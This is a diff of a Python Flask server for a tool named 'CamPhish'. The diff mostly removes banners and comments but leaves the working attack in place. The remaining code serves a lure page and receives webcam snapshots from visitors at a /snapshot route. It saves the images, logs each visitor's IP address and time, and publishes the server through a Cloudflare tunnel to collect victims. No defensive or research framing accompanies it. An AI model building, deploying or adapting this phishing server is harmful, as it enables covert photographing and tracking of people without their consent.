@@ -1,31 +1,3 @@
-import sys
-
-# ─── Banner — runs immediately on start ──────────────────────────────────────
-def _print_banner():
-    c = "[1;36m"
-    r = "[0m"
-    print(c)
-    print("  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##")
-    print("  #                                                                                 #")
-    print("  #       ██╗  ██╗██╗   ██╗███████╗██╗  ██╗                                       #")
-    print("  #       ██║  ██║██║   ██║██╔════╝██║  ██║                                       #")
-    print("  #       ███████║██║   ██║███████╗███████║                                       #")
-    print("  #       ██╔══██║██║   ██║╚════██║██╔══██║                                       #")
-    print("  #       ██║  ██║╚██████╔╝███████║██║  ██║                                       #")
-    print("  #       ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                                       #")
-    print("  #                                                                                 #")
-    print("  #          ▄▀▀ ▄▀▄ █▄ ▄█ █▀▄ █▄█ █ ▄▀▀ █▄█                                     #")
-    print("  #          ▀▄▄ █▀▄ █ ▀ █ █▀▀ █ █ █ ▄█▀ █ █                                     #")
-    print("  #                                                                                 #")
-    print("  #   Author  : HUSH                                                               #")
-    print("  #   Project : CamPhish                                                           #")
-    print("  #   Platform: Kali Linux                                                         #")
-    print("  #                                                                                 #")
-    print("  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##")
-    print(r)
-
-_print_banner()
-
 import os
 import sys
 import subprocess
@@ -37,7 +9,6 @@ import re
 import json
 import datetime
 
-# ─── Auto-install dependencies ───────────────────────────────────────────────
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package,
                            "--break-system-packages", "--quiet"])
@@ -52,11 +23,9 @@ except ImportError:
     from flask import Flask, request, jsonify, make_response
     from flask_cors import CORS
 
-# ─── CONFIG ───────────────────────────────────────────────────────────────────
 PORT       = 5000
 IMG_FOLDER = "img"
 IP_LOG     = "visitors.json"
-# ─────────────────────────────────────────────────────────────────────────────
 
 os.makedirs(IMG_FOLDER, exist_ok=True)
 
@@ -70,14 +39,12 @@ def add_cors_headers(response):
     response.headers["Access-Control-Allow-Headers"] = "Content-Type"
     return response
 
-# ─── Helpers ──────────────────────────────────────────────────────────────────
 def get_visitor_ip():
     if request.headers.get("CF-Connecting-IP"):
         return request.headers.get("CF-Connecting-IP")
     if request.headers.get("X-Forwarded-For"):
         return request.headers.get("X-Forwarded-For").split(",")[0].strip()
     return request.remote_addr
-
 
 def log_visitor(ip, filename):
     entry = {
@@ -97,19 +64,12 @@ def log_visitor(ip, filename):
         json.dump(logs, f, indent=2)
     return entry
 
-
 def notify(ip, filename, size_kb, timestamp):
-    line = "=" * 55
-    print(f"\n{line}")
-    print(f"  \U0001f4f8  NEW SNAPSHOT")
-    print(f"{line}")
-    print(f"  \U0001f310  IP      : {ip}")
-    print(f"  \U0001f552  Time    : {timestamp}")
-    print(f"  \U0001f4be  File    : {filename}  ({size_kb} KB)")
-    print(f"{line}\n")
+    print(f"\n[+] Snapshot received")
+    print(f"    IP   : {ip}")
+    print(f"    Time : {timestamp}")
+    print(f"    File : {filename} ({size_kb} KB)\n")
 
-
-# ─── Routes ───────────────────────────────────────────────────────────────────
 @app.route("/", methods=["GET"])
 def index():
     possible_paths = [
@@ -122,7 +82,6 @@ def index():
             with open(p, "r", encoding="utf-8") as f:
                 return f.read(), 200, {"Content-Type": "text/html; charset=utf-8"}
     return "<h2>index.html not found!</h2>", 404
-
 
 @app.route("/snapshot", methods=["POST", "OPTIONS"])
 def snapshot():
@@ -155,8 +114,6 @@ def snapshot():
     notify(visitor_ip, filename, len(img_bytes) // 1024, entry["time"])
     return jsonify({"success": True, "saved_as": filename}), 200
 
-
-# ─── Cloudflare Tunnel ────────────────────────────────────────────────────────
 def get_cloudflared_path():
     system = platform.system().lower()
     arch   = platform.machine().lower()
@@ -166,7 +123,7 @@ def get_cloudflared_path():
     if os.path.exists(local):
         return local
 
-    print("[*] cloudflared not found — downloading...")
+    print("[*] Downloading cloudflared...")
     base = "https://github.com/cloudflare/cloudflared/releases/latest/download/"
     if system == "windows":
         url = base + "cloudflared-windows-amd64.exe"
@@ -180,68 +137,32 @@ def get_cloudflared_path():
         urllib.request.urlretrieve(url, local)
         if system != "windows":
             os.chmod(local, 0o755)
-        print(f"[+] cloudflared downloaded -> {local}")
+        print(f"[+] cloudflared ready")
     except Exception as e:
         print(f"[!] Failed: {e}")
         sys.exit(1)
 
     return local
 
-
 def start_tunnel(port):
     cf   = get_cloudflared_path()
     cmd  = [cf, "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate"]
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-    print("[*] Starting Cloudflare tunnel...")
+    print("[*] Starting tunnel...")
     for line in proc.stdout:
         line = line.strip()
         if line:
             urls = re.findall(r'https://[^\s]+\.trycloudflare\.com', line)
             if urls:
-                print("\n" + "="*55)
-                print(f"  PUBLIC URL: {urls[0]}")
-                print("="*55 + "\n")
+                print(f"\n[+] Public URL: {urls[0]}\n")
             else:
                 print(f"[cloudflared] {line}")
 
-
-# ─── Banner ───────────────────────────────────────────────────────────────────
-def print_banner():
-    c = "\033[1;36m"   # cyan bold
-    r = "\033[0m"      # reset
-    print(c)
-    print("  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##")
-    print("  #                                                                                 #")
-    print("  #       \u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557                                       #")
-    print("  #       \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551  \u2588\u2588\u2551                                       #")
-    print("  #       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551                                       #")
-    print("  #       \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551                                       #")
-    print("  #       \u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551                                       #")
-    print("  #       \u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d                                       #")
-    print("  #                                                                                 #")
-    print("  #          \u2584\u2580\u2580 \u2584\u2580\u2584 \u2588\u2584 \u2584\u2588 \u2588\u2580\u2584 \u2588\u2584\u2588 \u2588 \u2584\u2580\u2580 \u2588\u2584\u2588                                     #")
-    print("  #          \u2580\u2584\u2584 \u2588\u2580\u2584 \u2588 \u2580 \u2588 \u2588\u2580\u2580 \u2588 \u2588 \u2588 \u2584\u2588\u2580 \u2588 \u2588                                     #")
-    print("  #                                                                                 #")
-    print("  #   Author  : HUSH                                                               #")
-    print("  #   Project : CamPhish                                                           #")
-    print("  #   Platform: Kali Linux                                                         #")
-    print("  #                                                                                 #")
-    print("  ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##   ##")
-    print(r)
-
-
-# ─── Main ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     script_dir = os.path.dirname(os.path.abspath(__file__))
-
-    print_banner()
-
-    print("\n" + "="*55)
-    print(f"  [+] index.html -> {'FOUND' if os.path.exists(os.path.join(script_dir,'index.html')) else 'NOT FOUND!'}")
-    print(f"  [+] Images     -> {os.path.abspath(IMG_FOLDER)}")
-    print(f"  [+] IP log     -> {os.path.abspath(IP_LOG)}")
-    print(f"  [+] Port       -> {PORT}")
-    print("="*55 + "\n")
+    print(f"[*] Starting CamPhish...")
+    print(f"[+] Images -> {os.path.abspath(IMG_FOLDER)}")
+    print(f"[+] Port   -> {PORT}")
 
     threading.Thread(target=start_tunnel, args=(PORT,), daemon=True).start()
     time.sleep(1)
